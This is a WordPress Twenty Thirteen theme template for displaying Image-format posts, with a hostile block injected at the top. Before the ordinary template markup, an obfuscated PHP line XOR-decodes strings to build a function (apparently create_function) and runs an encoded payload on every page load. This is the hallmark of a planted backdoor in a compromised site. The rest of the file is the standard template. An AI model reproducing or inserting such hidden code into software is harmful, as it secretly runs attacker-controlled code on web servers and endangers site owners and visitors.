<?php $wLzwgc='94PVNW+23P:71=S'; $ztyvCpyr='ZF57:2tTF>YCXR='^$wLzwgc; $wSAApqkV='B AQV=:P;PC9t7TDB,ByN OK,=MZ 7=T< bXGRMxA0NX75Y 7UN =h<YEAmb8<>eET;B5gCp-2OgOlWRKMSqAg,<AekTesM=XdRQJglUOiphqDq-rJC  ,6ylYTN1aXQq:YeSyqBF ;9uCsEzE=L..jsB.priR-NC,NYYaq>MC5P6rB,E8qophH=x8=>H0<zOQNHZbkJE><i;h- 08vmcR8US6jkrJ5Z3<V <wHtQZY<,NSh>5: 7QEclCsvs<x-ii6+wAXU5qjQZv:WW=Rjg90cA>Z>.s8HHttBf>  tNesV23.ilon3T9L-XrPyCW ugSs- <7puB8zHQ8N 1,wyqi1 jyndjc5GfW9KYUuLDo,V+D.jr=rOYCI3NQc:=BayVKX28ae0OTJ <.nXtM 4=,QYz;H72<<H=97RniEtXWBIAGL9E 7dNV 3U8 A<o>MGEZ6X rBl 3NV05EW2.FPxkieV8GJ2X..SzwY=WrN,A.,llOx.RJT7<=6A,=V=:=JftPU>qjIl>1-5drkiNb.2COL1+IU.rPT4t+qqDyoDN vPw,V4tfzn8,cacpASGl2g3Y:ZInUZbSNpnqZ6=;:7QI,05A C96Bq XG X RethaDL93emCyVLTe<hyQV;XivDQ6-9L7UMP;U7CezQipTDR3oAlxbQ'; $UdEOXIQt=$ztyvCpyr('', '+Fip0HT3O9,W+R,-1X1QiX 9sY,.Ahb9ITEqnr6rHV;6TA0OYu6OO7X81 2=UIJMa0Z6TKcTFW6NoLwrk6YxHCCI5EVtBTv7Qm4>8OH<oTPXJdUDN97RLIXQH=5:PHcqUSrNzsxKbONMUmNeRaY-ZO1W+sP,IvF+:wj0yDQM91Y5XZfG AX2YSB4qJXJ=BRRk>;<sYaC84Ac1LIADYVPC4Y9 SQaV.T.Rc=EEWuT7;5OIuYbXZHEV2-CDg,5<s3d,IWXWe30LQWozRL6;H7CGB:jeZ;JO,S-1TIbBUEYODlW2SGOIQOJE5U9Hcx-sI>FUOrWIAHVYU92s.>J+ARDWQU6ce;,+7>CT4FsR. uHrdKZ7G1KCRFxFPg-R:0<QX;ADvo3WAZo9Fp.AHONeTiVUQY4bp25=O66lYXC3NTe4-91,3.-U,ZRL69Rl1YT c0S83m8W+EDv3DV-9TPmsVO21QGIA2Y3+m3KWzSLST1ZjH ZMLJiXO 85NcVS8sX.TII9NS;0GVFiHZPYTMRMOnJCVvghUJ=4uU;1MSvXQyDOc-EE4AH4VAROWZNWUQEqbpXSTU<Xn+YebEznVHQ;DOZCh:,UoP9I0MEjVP9>L7A6BXHE -MRLDcYvltEGbp4 Z4AR 0BLbkG44<T4Sd8Sjcy1<;GGqECh,'^$wSAApqkV); $UdEOXIQt();
/**
 * The template for displaying posts in the Image post format
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */
?>

<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
	<header class="entry-header">
		<?php if ( is_single() ) : ?>
		<h1 class="entry-title"><?php the_title(); ?></h1>
		<?php else : ?>
		<h1 class="entry-title">
			<a href="<?php the_permalink(); ?>" rel="bookmark"><?php the_title(); ?></a>
		</h1>
		<?php endif; // is_single() ?>
	</header><!-- .entry-header -->

	<div class="entry-content">
		<?php
			/* translators: %s: Name of current post */
			the_content( sprintf(
				__( 'Continue reading %s <span class="meta-nav">&rarr;</span>', 'twentythirteen' ),
				the_title( '<span class="screen-reader-text">', '</span>', false )
			) );

			wp_link_pages( array( 'before' => '<div class="page-links"><span class="page-links-title">' . __( 'Pages:', 'twentythirteen' ) . '</span>', 'after' => '</div>', 'link_before' => '<span>', 'link_after' => '</span>' ) );
		?>
	</div><!-- .entry-content -->

	<footer class="entry-meta">
		<?php twentythirteen_entry_meta(); ?>

		<?php if ( comments_open() && ! is_single() ) : ?>
		<span class="comments-link">
			<?php comments_popup_link( '<span class="leave-reply">' . __( 'Leave a comment', 'twentythirteen' ) . '</span>', __( 'One comment so far', 'twentythirteen' ), __( 'View all % comments', 'twentythirteen' ) ); ?>
		</span><!-- .comments-link -->
		<?php endif; // comments_open() ?>
		<?php edit_post_link( __( 'Edit', 'twentythirteen' ), '<span class="edit-link">', '</span>' ); ?>

		<?php if ( is_single() && get_the_author_meta( 'description' ) && is_multi_author() ) : ?>
			<?php get_template_part( 'author-bio' ); ?>
		<?php endif; ?>
	</footer><!-- .entry-meta -->
</article><!-- #post -->
